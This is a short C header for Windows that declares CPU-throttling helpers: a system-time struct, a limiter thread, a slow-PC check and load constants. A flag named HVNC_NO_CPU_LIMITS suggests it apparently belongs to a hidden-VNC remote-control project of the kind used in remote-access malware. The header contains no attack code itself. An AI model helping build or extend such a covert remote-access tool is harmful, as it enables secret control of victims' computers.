#ifndef CPU_LIMIT_H_INCLUDED
#define CPU_LIMIT_H_INCLUDED

typedef struct _SYSTEM_TIME_INFORMATION {
    LARGE_INTEGER nKeBootTime;
    LARGE_INTEGER nKeSystemTime;
    LARGE_INTEGER nExpTimeZoneBias;
    ULONG uCurrentTimeZoneId;
    DWORD dwReserved;
} SYSTEM_TIME_INFORMATION, *PSYSTEM_TIME_INFORMATION;

void WINAPI CpuLimitThread(LPVOID);

void CheckPCPerfomance();

extern bool bCpuSleep,bSlowPC;

#define MAX_CPU_TIME_LIMIT 50
#define MAX_CPU_LOAD_DURATION 10000

#define Li2Double(x) ((double)(((LARGE_INTEGER)(x)).HighPart)*4.294967296E9+(double)(((LARGE_INTEGER)(x)).LowPart))

#define IsPCSlow(lpServer) ((bSlowPC) && (!(lpServer->DeskInfo.dwFlags & HVNC_NO_CPU_LIMITS)))

#endif // CPU_LIMIT_H_INCLUDED
